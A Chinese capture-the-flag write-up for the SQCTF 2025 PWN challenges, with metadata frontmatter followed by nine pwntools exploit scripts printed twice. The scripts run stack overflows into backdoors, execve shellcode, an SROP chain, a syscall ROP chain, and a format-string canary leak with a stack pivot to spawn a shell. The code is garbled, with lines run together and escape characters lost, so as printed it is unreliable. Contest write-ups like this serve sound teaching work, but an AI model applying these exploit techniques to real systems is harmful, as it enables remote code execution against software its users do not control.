---
title: 【WP】第四届 SQCTF 网络安全及信息对抗大赛 PWN 方向题目
contest: SQCTF
year: 2025
difficulty: medium
vuln_type: fmt_string
tags:
- ret2backdoor
- shellcode-injection
- SROP-SigreturnFrame
- fmt-leak-canary
- stack-pivot-leave-ret
- syscall-rax-rdi-rsi-rdx
- asm-pwntools
attack_chain: 1. cat ret2backdoor 0x40121B / 2. shellcode push /bin/sh + rax=0x3b syscall / 3. SROP frame rdi=/bin/sh rip=syscall 触发 sigreturn / 4. gift ret2backdoor / 5. pwn02 base64 编码 + ret2backdoor / 6. 自写 pop rdx/rsi/rdi/rax syscall 调用 / 7. fmt %11$p %15$p %17$p 泄 canary+proc+stack 后 leave-ret 跳板 / 8. key 直接传 FTCUNQS 字符串 / 9. shellcode.ljust(0x48) + 0x4040A0
key_payload: 9 个 PWN 题涵盖 ret2backdoor/shellcode/SROP/fmt-leak/stack-pivot/syscall/asm  全套 PWN 基础
one_liner: 第四届 SQCTF PWN 方向 9 题合集，覆盖 ret2backdoor + shellcode + SROP + fmt 泄 canary + stack pivot + syscall 全套入门。
lesson: PWN 入门九大题型：ret2backdoor / shellcode / SROP / fmt-leak / stack-pivot / syscall-rax / key-string / base64-wrap；asm() + shellcraft.sh() 是 pwntools 内置 shellcode 工具。
quality: high
full_path: 【WP】第四届SQCTF网络安全及信息对抗大赛PWN方向题目.full.md
meta_path: 【WP】第四届SQCTF网络安全及信息对抗大赛PWN方向题目.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【WP】第四届 SQCTF 网络安全及信息对抗大赛 PWN 方向题目。第四届 SQCTF PWN 方向 9 题合集，覆盖 ret2backdoor + shellcode + SROP + fmt 泄 canary + stack pivot + syscall 全套入门。。经验：PWN 入门九大题型：ret2backdoor / shellcode / SROP / fmt-leak / ...
category: pwn
subcategory: pwn_other
tools_used:
- pwntools
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/243289.html
reasoning_chain:
- 'pwn01 cat: read 0x50 字节无 canary → 触发点：栈溢出 → 动作：payload = b''a''*0x58 + p64(0x40121B backdoor)'
- 'pwn02 shellcode: mprotect 区域 → 动作：asm(shellcraft.sh()) + payload.ljust(0x48, b''\x00'') + p64(0x4040A0)'
- 'pwn SROP: SigreturnFrame 填 rdi=''/bin/sh'' rsi=0 rdx=0 rax=59 rip=syscall → 动作：sigreturn 还原全部寄存器 → execve'
- 'gift: 后门函数 0x4011DC 直接跳 → 动作：b''a''*0x48 + p64(0x4011DC)'
- 'pwn02 base64 wrap: payload 先 base64.b64encode 再 sendline → 动作：服务端会解码执行'
- 自写 syscall 链：pop_rdx_rsi_rdi_rax_ret + 0 + 0 + binsh + 59 + syscall → 动作：纯汇编调 execve
- 'fmt leak: sendline(''%11$p-%15$p-%17$p'') → 触发点：format string 泄 canary/proc/stack'
- 动作：canary + leave-ret stack pivot 跳板 → system('/bin/sh')
- key 题：读 8 字节硬编码 'FTCUNQS' → 动作：payload = b'\x46\x54\x43\x55\x4e\x51\x53\x00'
failed_attempts:
- 试图用 ret2libc 解无 libc 题 → 失败：题目没给 libc，用后门更稳
- 试图调 system() 触发 SROP → 失败：SROP 必须 syscall 调 execve，不能 libc wrapper
- 试图用普通 ROP 绕过 canary → 失败：必须先 %n$p 泄 canary 再覆盖
key_observations:
- PWN 入门九大题型：ret2backdoor / shellcode / SROP / fmt-leak / stack-pivot / syscall-rax / key-string / base64-wrap / shellcraft
- SROP = SigreturnFrame 还原全部寄存器 → 单 syscall 触发 execve 是终极招
- fmt %n$p 泄 canary 是栈溢出 + canary 题标准流程
- leave; ret 是 stack pivot 到 controlled buffer 的最简 gadget
- pwntools shellcraft.sh() 自动生成 execve('/bin/sh') shellcode
prerequisites:
- pwntools 基础（remote / ELF / p64 / shellcraft）
- ROP 链构造（pop rdi/rsi/rdx/rax + syscall）
- SROP SigreturnFrame 用法
- 格式化字符串漏洞（%n$p 任意读）
---
# 【WP】第四届SQCTF网络安全及信息对抗大赛PWN方向题目

> 原文: https://www.ctfiot.com/243289.html
> ID: 243289

接上文

【WP】第四届SQCTF网络安全及信息对抗大赛WEB方向题目全解

【WP】第四届SQCTF网络安全及信息对抗大赛Crypto方向题目全解

【WP】第四届SQCTF网络安全及信息对抗大赛Re方向题目全解

继续整理PWN方向的WP

from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31125)#p=process('./cat')
backdoor = 0x40121Bpayload = b'a'*(0x50+0x8)+p64(backdoor)p.sendlineafter(b'charactersn',payload)p.interactive()

rax = 0x3brdi = "/bin//sh"指针rsi = 0rdx = 0syscall

from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30871)#p=process('./pwn')#p=gdb.debug('./pwn','b main')
shellcode = '''    xor rsi,rsi    push rsi    mov rdi,0x68732f2f6e69622f    push rdi    push rsp    pop rdi    mov rax,0x3b    cdq    syscall'''payload=asm(shellcode)p.sendafter(b'window.n',payload)p.interactive()

rax = 0x3brdi = "/bin/sh"rsi = 0rdx = 0syscall

from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32328)#p=process('./pwn01')#p=gdb.debug('./pwn01','b _start')
frame = SigreturnFrame()frame.rdi = 0x40203a               # "/bin/sh"frame.rsi = 0                       # argv = NULLframe.rdx = 0                       # envp = NULLframe.rax = 59                      # execveframe.rip = 0x40101d                # syscall instructionrop = b'a'*0x8rop += p64(0x401049) #pop rsi; pop rax; retnrop += p64(0)rop += p64(15)rop += p64(0x40101d) #syscallrop += bytes(frame)   p.send(rop)p.interactive()

from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32420)#p=process('./gift')
backdoor = 0x4011DCpayload = b'a'*(0x40+0x8)+p64(backdoor)p.sendlineafter(b'gift?n',payload)p.interactive()

from pwn import *from LibcSearcher import *import base64context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31613)#p=process('./pwn02')
backdoor = 0x401422payload = b'a'*(0x60+0x8)+p64(backdoor)+p64(0)payload = base64.b64encode(payload)p.sendlineafter(b'now?n',payload)p.interactive()

from pwn import *from LibcSearcher import *import base64context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32436)#p=process('./pwn')
pop_rdx_rsi_rdi_rax_ret = 0x4011E0syscall_addr = 0x4011ECp.sendline(b'/bin/shx00')p.recvuntil(b'0x')binsh_addr = int(p.recv(12),16)p.recv()p.sendline(b'1')payload = b'/bin/shx00'+b'a'*0x20+p64(pop_rdx_rsi_rdi_rax_ret)+p64(0)+p64(0)+p64(binsh_addr)+p64(0x3b)+p64(syscall_addr)p.sendline(payload)p.interactive()

from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31171)#p=process('./pwn03')elf = ELF('./pwn03')
p.sendlineafter(b'sun.n',b'%11$p-%15$p-%17$p')p.recvuntil(b'0x')canary = int(p.recv(16),16)p.recvuntil(b'0x')proc = int(p.recv(12),16)proc_base = proc-0x125bp.recvuntil(b'0x')stack = int(p.recv(12),16)stack_input = stack-0x148main_addr = 0x1260pop_rdi_ret = 0x1245pop_rbp_ret = 0x11d3call_system = 0x1253leave_ret = 0x1234system_plt = elf.plt['system']ret_addr = 0x125Apayload = b'a'*0x8+p64(canary)+p64(0xdeadbeef)+p64(proc_base+main_addr)p.send(payload)payload = p64(proc_base+ret_addr)+p64(proc_base+pop_rdi_ret)+p64(stack_input-0x10)+p64(proc_base+call_system)+b'/bin/sh'p.sendafter(b'sun.n',payload)payload = b'a'*0x8+p64(canary)+p64(stack_input-0x30-0x8)+p64(proc_base+leave_ret)p.send(payload)p.interactive()

from pwn import *from LibcSearcher import *from struct import packfrom ctypes import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30422)#p=process('./key')elf = ELF('./key')
payload = b'x46x54x43x55x4ex51x53x00'p.sendafter(b'key: ',payload)p.interactive()

from pwn import *from LibcSearcher import *from struct import packfrom ctypes import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30632)#p=process('./bad')elf = ELF('./bad')
shellcode=asm(shellcraft.sh())payload = shellcode.ljust(0x48,b'x00')+p64(0x4040A0)p.sendlineafter(b'do ?n',payload)p.interactive()


```
from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31125)#p=process('./cat')
backdoor = 0x40121Bpayload = b'a'*(0x50+0x8)+p64(backdoor)p.sendlineafter(b'charactersn',payload)p.interactive()
rax = 0x3brdi = "/bin//sh"指针rsi = 0rdx = 0syscall
from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30871)#p=process('./pwn')#p=gdb.debug('./pwn','b main')
shellcode = '''    xor rsi,rsi    push rsi    mov rdi,0x68732f2f6e69622f    push rdi    push rsp    pop rdi    mov rax,0x3b    cdq    syscall'''payload=asm(shellcode)p.sendafter(b'window.n',payload)p.interactive()
rax = 0x3brdi = "/bin/sh"rsi = 0rdx = 0syscall
from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32328)#p=process('./pwn01')#p=gdb.debug('./pwn01','b _start')
frame = SigreturnFrame()frame.rdi = 0x40203a               # "/bin/sh"frame.rsi = 0                       # argv = NULLframe.rdx = 0                       # envp = NULLframe.rax = 59                      # execveframe.rip = 0x40101d                # syscall instructionrop = b'a'*0x8rop += p64(0x401049) #pop rsi; pop rax; retnrop += p64(0)rop += p64(15)rop += p64(0x40101d) #syscallrop += bytes(frame)   p.send(rop)p.interactive()
from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32420)#p=process('./gift')
backdoor = 0x4011DCpayload = b'a'*(0x40+0x8)+p64(backdoor)p.sendlineafter(b'gift?n',payload)p.interactive()
from pwn import *from LibcSearcher import *import base64context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31613)#p=process('./pwn02')
backdoor = 0x401422payload = b'a'*(0x60+0x8)+p64(backdoor)+p64(0)payload = base64.b64encode(payload)p.sendlineafter(b'now?n',payload)p.interactive()
from pwn import *from LibcSearcher import *import base64context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 32436)#p=process('./pwn')
pop_rdx_rsi_rdi_rax_ret = 0x4011E0syscall_addr = 0x4011ECp.sendline(b'/bin/shx00')p.recvuntil(b'0x')binsh_addr = int(p.recv(12),16)p.recv()p.sendline(b'1')payload = b'/bin/shx00'+b'a'*0x20+p64(pop_rdx_rsi_rdi_rax_ret)+p64(0)+p64(0)+p64(binsh_addr)+p64(0x3b)+p64(syscall_addr)p.sendline(payload)p.interactive()
from pwn import *from LibcSearcher import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 31171)#p=process('./pwn03')elf = ELF('./pwn03')
p.sendlineafter(b'sun.n',b'%11$p-%15$p-%17$p')p.recvuntil(b'0x')canary = int(p.recv(16),16)p.recvuntil(b'0x')proc = int(p.recv(12),16)proc_base = proc-0x125bp.recvuntil(b'0x')stack = int(p.recv(12),16)stack_input = stack-0x148main_addr = 0x1260pop_rdi_ret = 0x1245pop_rbp_ret = 0x11d3call_system = 0x1253leave_ret = 0x1234system_plt = elf.plt['system']ret_addr = 0x125Apayload = b'a'*0x8+p64(canary)+p64(0xdeadbeef)+p64(proc_base+main_addr)p.send(payload)payload = p64(proc_base+ret_addr)+p64(proc_base+pop_rdi_ret)+p64(stack_input-0x10)+p64(proc_base+call_system)+b'/bin/sh'p.sendafter(b'sun.n',payload)payload = b'a'*0x8+p64(canary)+p64(stack_input-0x30-0x8)+p64(proc_base+leave_ret)p.send(payload)p.interactive()
from pwn import *from LibcSearcher import *from struct import packfrom ctypes import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30422)#p=process('./key')elf = ELF('./key')
payload = b'x46x54x43x55x4ex51x53x00'p.sendafter(b'key: ',payload)p.interactive()
from pwn import *from LibcSearcher import *from struct import packfrom ctypes import *context(log_level = 'debug', arch = 'amd64', os = 'linux')p = remote('challenge.qsnctf.com', 30632)#p=process('./bad')elf = ELF('./bad')
shellcode=asm(shellcraft.sh())payload = shellcode.ljust(0x48,b'x00')+p64(0x4040A0)p.sendlineafter(b'do ?n',payload)p.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]